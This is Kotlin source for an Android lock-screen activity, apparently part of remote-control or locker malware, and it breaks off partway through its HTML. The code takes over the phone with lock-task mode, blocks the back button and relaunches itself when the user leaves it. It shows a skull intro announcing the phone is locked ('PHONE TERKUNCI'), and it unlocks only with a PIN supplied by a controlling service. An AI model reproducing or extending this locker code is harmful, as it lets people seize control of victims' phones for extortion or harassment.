package com.sync.xxx

import android.annotation.SuppressLint
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.media.MediaPlayer
import android.webkit.WebViewClient

class LockNewActivity : Activity() {

    private lateinit var webView: WebView
    private var mediaPlayer: MediaPlayer? = null
    private var correctPin: String  = ""
    private var lockTitle: String   = "Perangkat Terkunci"
    private var customHtml: String  = ""
    private var isReceiverRegistered = false
    private var isUnlocked = false

    private val unlockReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.UNLOCK") {
                isUnlocked = true
                finish()
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: ""
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: "Perangkat Terkunci"
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: ""

        setupWebView()
        registerUnlockReceiver()

        try {
    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
    if (dpm.isLockTaskPermitted(packageName)) startLockTask()
} catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "startLockTask: ${e.message}")
        }
        playLockSound()
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: correctPin
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: lockTitle
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: customHtml
    }

    override fun onBackPressed() {
    if (!isUnlocked) return
    super.onBackPressed()
}

    override fun onPause() {
        super.onPause()
        if (isUnlocked) return
        val handler = android.os.Handler(android.os.Looper.getMainLooper())
        handler.postDelayed({
            if (isUnlocked) return@postDelayed
            val intent = Intent(this, LockNewActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                putExtra(LockOverlayService.EXTRA_PIN, correctPin)
                putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
                putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
            }
            startActivity(intent)
        }, 300)
    }

    override fun onStop() {
    super.onStop()
    if (isUnlocked) return
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
        val intent = Intent(this, LockNewActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            putExtra(LockOverlayService.EXTRA_PIN, correctPin)
            putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
            putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
        }
        startActivity(intent)
    }
}

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = WebView(this)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
        }
        webView.setBackgroundColor(android.graphics.Color.TRANSPARENT)
        webView.addJavascriptInterface(LockBridge(), "LockBridge")
        webView.webViewClient = WebViewClient()
        if (customHtml.isNotEmpty()) {
            webView.loadDataWithBaseURL(null, buildCustomLockHtml(customHtml), "text/html", "UTF-8", null)
        } else {
            webView.loadDataWithBaseURL(null, buildLockHtml(), "text/html", "UTF-8", null)
        }
        setContentView(webView)
    }

    private fun buildCustomLockHtml(body: String): String {
        return """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{width:100%;height:100%;background:transparent;overflow:hidden;display:flex;align-items:center;justify-content:center}
#wrap{width:100%;height:100%;display:flex;align-items:center;justify-content:center}
</style>
</head>
<body>
<div id="wrap">
${body}
</div>
</body>
</html>""".trimIndent()
    }

    private fun registerUnlockReceiver() {
        if (isReceiverRegistered) return
        try {
            val filter = IntentFilter("com.sync.xxx.UNLOCK")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(unlockReceiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(unlockReceiver, filter)
            }
            isReceiverRegistered = true
        } catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "registerReceiver: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { stopLockTask() } catch (_: Exception) {}
        if (isReceiverRegistered) {
            try { unregisterReceiver(unlockReceiver) } catch (_: Exception) {}
            isReceiverRegistered = false
        }
        mediaPlayer?.release()
        mediaPlayer = null
        webView.destroy()
    }

    inner class LockBridge {
        @JavascriptInterface
        fun tryUnlock(pin: String): Boolean {
            val ok = (pin == correctPin)
            if (ok) {
                android.os.Handler(android.os.Looper.getMainLooper()).post {
                    try {
                        val cmdIntent = Intent(DeviceService.ACTION_COMMAND).apply {
                            putExtra(DeviceService.EXTRA_COMMAND, "unlockDevice")
                            putExtra(DeviceService.EXTRA_VALUE, "true")
                            setPackage(packageName)
                        }
                        sendBroadcast(cmdIntent)
                    } catch (e: Exception) {
                        android.util.Log.w("LockNewActivity", "broadcast: ${e.message}")
                    }
                    val unlockIntent = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
                    sendBroadcast(unlockIntent)
                }
            }
            return ok
        }

        @JavascriptInterface
        fun getLockTitle(): String = lockTitle
    }

    private fun playLockSound() {
        try {
            val afd = resources.openRawResourceFd(R.raw.lock) ?: return
            mediaPlayer = MediaPlayer().apply {
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                prepare()
                start()
                setOnCompletionListener { release(); mediaPlayer = null }
            }
        } catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "playLockSound: ${e.message}")
        }
    }

    private fun buildLockHtml(): String {
        val safeTitle = lockTitle
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace("\"", "&quot;")

        return """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#050a05;
  --card:#0a180a;
  --red:#00ff41;
  --green:#00ff41;
  --green-dim:rgba(0,255,65,.08);
  --green-brd:rgba(0,255,65,.2);
  --green-glow:rgba(0,255,65,.35);
  --text:#e0ffe0;
  --text2:#44aa44;
  --text3:#1a4a1a;
}
html,body{height:100%;width:100%;overflow:hidden;touch-action:none}
body{
  background:var(--bg);
  font-family:'Outfit',sans-serif;
  -webkit-font-smoothing:antialiased;
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  min-height:100vh;
  padding:32px 28px;
  position:relative;
  overflow:hidden;
}

/* ── CRACKED GLASS BACKGROUND ── */
.crack-layer{
  position:fixed;inset:0;pointer-events:none;z-index:0;
  overflow:hidden;
}
.crack-layer svg{
  width:100%;height:100%;
  opacity:0.18;
}

/* ── SCANLINE OVERLAY ── */
body::after{
  content:'';position:fixed;inset:0;
  background:repeating-linear-gradient(
    0deg,
    transparent,
    transparent 2px,
    rgba(0,255,65,.018) 2px,
    rgba(0,255,65,.018) 4px
  );
  pointer-events:none;
  z-index:1;
  animation:scanMove 8s linear infinite;
}
@keyframes scanMove{
  0%{background-position:0 0}
  100%{background-position:0 100px}
}

/* ── AMBIENT GLOW ── */
body::before{
  content:'';position:fixed;inset:0;
  background:
    radial-gradient(ellipse 80% 50% at 50% -5%,rgba(0,200,50,.14) 0%,transparent 60%),
    radial-gradient(ellipse 50% 40% at 10% 90%,rgba(200,20,20,.06) 0%,transparent 55%),
    radial-gradient(ellipse 50% 35% at 90% 85%,rgba(0,180,40,.05) 0%,transparent 55%);
  pointer-events:none;
  z-index:0;
}

/* glitch flicker */
@keyframes glitch{
  0%,94%,100%{clip-path:none;transform:none;opacity:1}
  95%{clip-path:inset(30% 0 40% 0);transform:translateX(-4px);opacity:.85}
  97%{clip-path:inset(60% 0 10% 0);transform:translateX(4px);opacity:.9}
  99%{clip-path:inset(5% 0 80% 0);transform:translateX(-2px)}
}

/* ── INTRO SCREEN ── */
#introScreen{
  position:fixed;inset:0;
  background:#000;
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  z-index:100;
  gap:20px;
  animation:introDismiss .4s ease forwards 4s;
}
@keyframes introDismiss{
  0%{opacity:1;transform:none}
  100%{opacity:0;transform:scale(1.06);pointer-events:none}
}
#introScreen.done{display:none}

.intro-skull{
  animation:pulseRed 1s ease-in-out infinite;
}
@keyframes pulseRed{
  0%,100%{filter:drop-shadow(0 0 8px #00ff41) drop-shadow(0 0 24px #00ff41)}
  50%{filter:drop-shadow(0 0 20px #00ff41) drop-shadow(0 0 50px #00ff41)}
}

.intro-title{
  font-family:'JetBrains Mono',monospace;
  font-size:20px;
  letter-spacing:3px;
  text-transform:uppercase;
  color:#00ff41;
  text-align:center;
  line-height:1.8;
}
.intro-title .line{
  display:block;
  overflow:hidden;
  white-space:nowrap;
}
.intro-title .line1{animation:typeIn .6s steps(22,end) .3s both}
.intro-title .line2{animation:typeIn .5s steps(18,end) 1.1s both}
.intro-title .line3{animation:typeIn .7s steps(26,end) 1.8s both}
@keyframes typeIn{from{width:0;opacity:0}to{opacity:1}}

.intro-bar-wrap{
  width:220px;height:3px;
  background:rgba(255,0,0,.15);
  border-radius:2px;
  overflow:hidden;
}
.intro-bar{
  height:100%;width:0%;
  background:linear-gradient(90deg,#00ff41,#00ff41,#00ff41);
  border-radius:2px;
  animation:barFill 2.5s ease .5s forwards;
  box-shadow:0 0 10px #00ff41;
}
@keyframes barFill{to{width:100%}}

.intro-pct{
  font-family:'JetBrains Mono',monospace;
  font-size:10px;letter-spacing:2px;
  color:#00ff41;
  animation:countUp 2.5s ease .5s forwards;
}
@keyframes countUp{
  0%{content:'0%'}
}

/* ── MAIN CONTENT ── */
#mainContent{
  display:flex;flex-direction:column;align-items:center;
  position:relative;z-index:2;
  opacity:0;
  animation:mainIn .6s ease forwards 4.4s;
  width:100%;
}
@keyframes mainIn{to{opacity:1}}

/* ── VIRUS ICON ── */
.virus-wrap{
  position:relative;width:100px;height:100px;
  margin-bottom:22px;flex-shrink:0;
}
.virus-bg{
  width:100px;height:100px;border-radius:50%;
  background:radial-gradient(circle at 40% 35%,rgba(0,255,65,.12),rgba(0,80,20,.05));
  border:1px solid rgba(0,255,65,.22);
  display:flex;align-items:center;justify-content:center;
  position:relative;z-index:1;
  box-shadow:0 0 0 1px rgba(0,0,0,.5),0 0 40px rgba(0,255,65,.18),inset 0 1px 0 rgba(0,255,100,.08);
  animation:virusPulse 2.5s ease-in-out infinite;
}
@keyframes virusPulse{
  0%,100%{box-shadow:0 0 0 1px rgba(0,0,0,.5),0 0 30px rgba(0,255,65,.15),inset 0 1px 0 rgba(0,255,100,.08)}
  50%{box-shadow:0 0 0 1px rgba(0,0,0,.5),0 0 60px rgba(0,255,65,.35),0 0 90px rgba(0,255,65,.1),inset 0 1px 0 rgba(0,255,100,.12)}
}

/* rotating orbit rings */
.v-orbit{
  position:absolute;inset:-12px;border-radius:50%;
  border:1px solid rgba(0,255,65,.12);
  animation:orbitSpin 6s linear infinite;
}
.v-orbit2{
  position:absolute;inset:-22px;border-radius:50%;
  border:1px dashed rgba(0,255,65,.07);
  animation:orbitSpin 10s linear infinite reverse;
}
.v-orbit::before,.v-orbit::after{
  content:'';position:absolute;width:6px;height:6px;border-radius:50%;
  background:var(--green);top:50%;left:-3px;margin-top:-3px;
  box-shadow:0 0 8px var(--green),0 0 16px var(--green);
}
.v-orbit::after{left:auto;right:-3px;}
@keyframes orbitSpin{to{transform:rotate(360deg)}}

/* virus SVG spin */
.virus-svg{animation:virusSpin 8s linear infinite;}
@keyframes virusSpin{to{transform:rotate(360deg)}}

/* spike pulse dots */
.spike-dot{
  position:absolute;width:5px;height:5px;border-radius:50%;
  background:var(--green);
  box-shadow:0 0 8px var(--green),0 0 16px var(--green);
  animation:spikePulse 1.5s ease-in-out infinite;
}
.spike-dot:nth-child(1){top:2px;left:50%;transform:translateX(-50%);animation-delay:0s}
.spike-dot:nth-child(2){bottom:2px;left:50%;transform:translateX(-50%);animation-delay:.3s}
.spike-dot:nth-child(3){left:2px;top:50%;transform:translateY(-50%);animation-delay:.6s}
.spike-dot:nth-child(4){right:2px;top:50%;transform:translateY(-50%);animation-delay:.9s}
@keyframes spikePulse{
  0%,100%{opacity:1;transform:scale(1) translateX(-50%)}
  50%{opacity:.3;transform:scale(.5) translateX(-50%)}
}
/* fix non-centered dots */
.spike-dot:nth-child(3){animation-name:spikePulseY}
.spike-dot:nth-child(4){animation-name:spikePulseY}
@keyframes spikePulseY{
  0%,100%{opacity:1;transform:scale(1) translateY(-50%)}
  50%{opacity:.3;transform:scale(.5) translateY(-50%)}
}

/* ── TITLE ── */
.lock-title{
  font-size:22px;font-weight:800;
  color:var(--text);
  text-align:center;letter-spacing:-.3px;line-height:1.2;
  margin-bottom:4px;
  animation:glitch 7s ease infinite;
  text-shadow:0 0 20px rgba(0,255,65,.3);
}
.lock-sub{
  font-family:'JetBrains Mono',monospace;font-size:9px;
  color:#1a5a1a;letter-spacing:2.5px;text-transform:uppercase;
  text-align:center;margin-bottom:30px;
}

/* ── PIN DOTS ── */
.pin-wrap{display:flex;gap:16px;justify-content:center;margin-bottom:10px;}
.pin-dot{
  width:14px;height:14px;border-radius:50%;
  border:1.5px solid rgba(0,255,65,.2);
  background:transparent;
  transition:background .18s,border-color .18s,box-shadow .18s,transform .18s;
}
.pin-dot.filled{
  background:var(--green);border-color:var(--green);
  box-shadow:0 0 14px rgba(0,255,65,.8),0 0 28px rgba(0,255,65,.4);
  transform:scale(1.12);
}
.pin-dot.error{
  border-color:#00ff41;background:rgba(255,20,20,.3);
  box-shadow:0 0 12px rgba(255,40,40,.6);
  animation:shake .38s ease;
}
@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-7px)}75%{transform:translateX(7px)}}

/* ── STATUS ── */
.pin-status{
  height:24px;margin-bottom:28px;
  font-family:'JetBrains Mono',monospace;font-size:10px;
  letter-spacing:2px;text-transform:uppercase;
  text-align:center;color:#1a5a1a;transition:color .2s;
}
.pin-status.err{color:#ff3333}
.pin-status.ok{color:var(--green);text-shadow:0 0 10px var(--green)}

/* ── KEYPAD ── */
.keypad{
  display:grid;grid-template-columns:repeat(3,1fr);
  gap:10px;width:100%;max-width:292px;
}
.key{
  height:66px;border-radius:14px;
  border:1px solid rgba(0,255,65,.06);
  background:linear-gradient(160deg,rgba(0,255,65,.04),rgba(0,80,20,.03));
  color:var(--text);
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  cursor:pointer;-webkit-tap-highlight-color:transparent;
  transition:transform .1s,background .1s,border-color .1s,box-shadow .1s;
  position:relative;overflow:hidden;user-select:none;
  box-shadow:0 2px 8px rgba(0,0,0,.5),inset 0 1px 0 rgba(0,255,65,.03);
}
.key::before{
  content:'';position:absolute;top:0;left:10%;right:10%;height:1px;
  background:linear-gradient(90deg,transparent,rgba(0,255,65,.07),transparent);
}
.key .num{font-size:22px;font-weight:700;line-height:1;letter-spacing:-.3px;color:#e0ffe0;}
.key .sub{font-family:'JetBrains Mono',monospace;font-size:7px;letter-spacing:2px;color:#1a5a1a;margin-top:3px}
.key.del{color:var(--text2)}
.key.empty{pointer-events:none;opacity:0;background:transparent;border-color:transparent;box-shadow:none}
.key:active{
  transform:scale(.93);
  background:linear-gradient(160deg,rgba(0,255,65,.14),rgba(0,120,40,.1));
  border-color:rgba(0,255,65,.3);
  box-shadow:0 0 20px rgba(0,255,65,.15),inset 0 1px 0 rgba(0,255,65,.1);
}

/* ── INTRO COUNTER HACK ── */
.intro-pct-wrap{
  font-family:'JetBrains Mono',monospace;
  font-size:10px;letter-spacing:2px;color:#00ff41;
  height:16px;overflow:hidden;
  position:relative;width:60px;text-align:center;
}
.pct-num{
  position:absolute;width:100%;text-align:center;
  animation:pctAnim 2.5s ease .5s forwards;
}
@keyframes pctAnim{
  0%{content:'0%';}
}

/* DATA STREAM PARTICLES */
.data-stream{
  position:fixed;top:0;left:0;width:100%;height:100%;
  pointer-events:none;z-index:0;overflow:hidden;
}
.data-col{
  position:absolute;top:-100%;
  font-family:'JetBrains Mono',monospace;
  font-size:11px;color:rgba(0,255,65,.15);
  line-height:1.4;
  animation:dataFall linear infinite;
  white-space:pre;
}
@keyframes dataFall{
  to{top:110%}
}

/* ── ENTRY ANIMATIONS ── */
.virus-wrap{animation:popIn .5s cubic-bezier(.16,1,.3,1) both}
@keyframes popIn{from{opacity:0;transform:scale(.7)}to{opacity:1;transform:none}}
.lock-title{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .08s both}
.lock-sub{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .13s both}
.pin-wrap{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .18s both}
.pin-status{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .22s both}
.keypad{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .27s both}
@keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:none}}
</style>
</head>
<body>

<!-- INTRO SCREEN -->
<div id="introScreen">
  <div class="intro-skull">
    <svg width="72" height="72" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
      <ellipse cx="32" cy="26" rx="18" ry="17" fill="none" stroke="#00ff41" stroke-width="2"/>
      <ellipse cx="24" cy="24" rx="5.5" ry="6" fill="rgba(255,51,51,0.25)" stroke="#00ff41" stroke-width="1.5"/>
      <ellipse cx="40" cy="24" rx="5.5" ry="6" fill="rgba(255,51,51,0.25)" stroke="#00ff41" stroke-width="1.5"/>
      <path d="M30 32 L32 28 L34 32 Z" fill="rgba(255,51,51,0.4)" stroke="#00ff41" stroke-width="1"/>
      <path d="M14 38 Q14 48 22 48 L22 52 L26 52 L26 48 L32 48 L32 52 L36 52 L36 48 L42 48 Q50 48 50 38" stroke="#00ff41" stroke-width="2" fill="none" stroke-linecap="round"/>
      <line x1="26" y1="48" x2="26" y2="42" stroke="#00ff41" stroke-width="1.5"/>
      <line x1="32" y1="48" x2="32" y2="42" stroke="#ff3333" stroke-width="1.5"/>
      <line x1="38" y1="48" x2="38" y2="42" stroke="#00ff41" stroke-width="1.5"/>
      <path d="M14 38 Q32 44 50 38" stroke="#00ff41" stroke-width="1.5" fill="none"/>
    </svg>
  </div>

  <div class="intro-title">
    <span class="line line1">HAII BROOO</span>
    <span class="line line2">GENETICAL SYSTEM</span>
    <span class="line line3">PHONE TERKUNCI</span>
  </div>

  <div class="intro-bar-wrap">
    <div class="intro-bar"></div>
  </div>

  <div class="intro-pct-wrap">
    
